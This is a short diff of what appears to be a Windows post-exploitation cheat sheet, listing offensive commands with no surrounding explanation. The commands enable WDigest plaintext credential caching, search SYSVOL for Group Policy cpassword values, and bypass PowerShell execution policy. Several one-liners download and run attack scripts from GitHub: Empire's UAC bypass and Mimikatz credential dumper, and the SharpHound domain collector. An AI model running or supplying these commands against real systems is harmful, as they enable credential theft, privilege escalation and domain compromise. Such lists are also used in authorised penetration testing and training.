@@ -17,9 +17,8 @@ netstat -ano
 reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
 findstr /S cpassword $env:logonserver\sysvol\*.xml
 findstr /S cpassword %logonserver%\sysvol\*.xml
-runas /user:LABS\itadmin /noprofile powershell.exe
-
 powershell -ep bypass
+
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1')
 Invoke-BypassUAC -Command 'start powershell.exe'
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
@@ -28,4 +27,3 @@ IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.c
 Invoke-AllChecks
 IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1')
 Invoke-BloodHound
-
